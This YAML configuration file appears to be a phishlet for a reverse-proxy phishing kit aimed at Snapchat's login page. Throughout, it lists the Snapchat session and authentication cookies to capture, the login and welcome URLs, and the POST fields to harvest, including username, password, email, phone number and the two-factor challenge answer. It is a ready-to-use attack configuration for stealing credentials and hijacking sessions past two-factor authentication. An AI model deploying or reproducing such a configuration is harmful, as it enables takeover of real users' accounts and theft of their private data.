auth_tokens:
  - domain: '.snapchat.com'
    keys: ['sc-a-nonce', web_client_id', 'sc-cookies-accepted', 'sc-a-csrf', 'sc-a-session', 'xsrf_token', '_sc-sid', 'sc-wcid', '_scid', '_scid_r', '__Host-sc-authn-session-payload', '__Host-X-Snap-Client-Cookie', '__Host-sc-a-nonce', '__Host-sc-a-auth-session', '.*,regexp']
    type: 'cookie'
  - domain: 'accounts.snapchat.com'
    keys: ['xsrf_token', '_sc-sid', 'sc-wcid', '.*,regexp']
    type: 'cookie'
   


auth_urls:
  - '/v2/welcome'
  - '/accounts/welcome'



credentials:
  username:
    key: "accountIdentifier"
    search: "(.*)"
    type: "post"
  password:
    key: "password"
    search: "(.*)"
    type: "post"
  custom:
    - key: "email"
      search: "email\":\"(.*?)\""
      type: "post"
    - key: 'ai_token'
      search: "(.*)"
      type: 'post'
    - key: 'twoFAChallengeAnswer'
      search: "(.*)"
      type: 'post'
    - key: 'accountIdentifierCountryCode'
      search: "(.*)"
      type: 'post'
    - key: 'accountIdentifierPhoneNumber'
      search: "(.*)"
      type: 'post'


login:
  domain: 'accounts.snapchat.com'
  path: '/accounts/v2/login'